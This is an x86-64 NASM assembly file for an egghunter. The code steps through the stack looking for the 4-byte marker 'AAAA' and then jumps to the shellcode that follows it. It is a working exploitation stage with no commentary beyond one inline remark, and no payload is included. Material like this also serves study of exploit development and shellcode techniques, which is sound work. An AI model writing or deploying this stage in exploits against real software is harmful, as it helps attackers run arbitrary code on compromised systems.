BITS 64

the_egg equ 'AAAA'

global _start:
section .text
_start:
    add rsp, 22 ; Skip the egghunter shellcode
_huntloop:
    
    inc rsp
    cmp dword [rsp], the_egg
    jne _huntloop
    add rsp, 4
    jmp rsp
